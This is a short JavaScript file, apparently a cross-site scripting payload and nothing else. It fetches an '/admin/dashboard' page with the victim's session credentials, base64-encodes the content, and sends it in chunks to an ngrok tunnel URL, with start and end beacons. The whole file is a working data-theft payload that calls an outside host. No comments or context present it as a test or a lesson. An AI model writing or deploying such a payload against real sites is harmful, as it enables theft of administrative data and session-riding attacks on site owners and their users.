const exfil="https://30a8-2402-800-61c7-539d-60ad-28f0-6942-5ea2.ngrok-free.app";
const chunkSize=500;

async function sendChunk(data,i){
  let url=exfil+"?step="+i+"&data="+encodeURIComponent(btoa(data));
  await fetch(url,{mode:"no-cors"});
}

async function dumpDashboard(){

  await fetch(exfil+"?note=start",{mode:"no-cors"});

  let res=await fetch("/admin/dashboard",{credentials:"include"});
  let text=await res.text();

  for(let i=0;i<text.length;i+=chunkSize){
    let chunk=text.slice(i,i+chunkSize);
    await sendChunk(chunk,i);
  }

  await fetch(exfil+"?note=end",{mode:"no-cors"});
}

dumpDashboard();
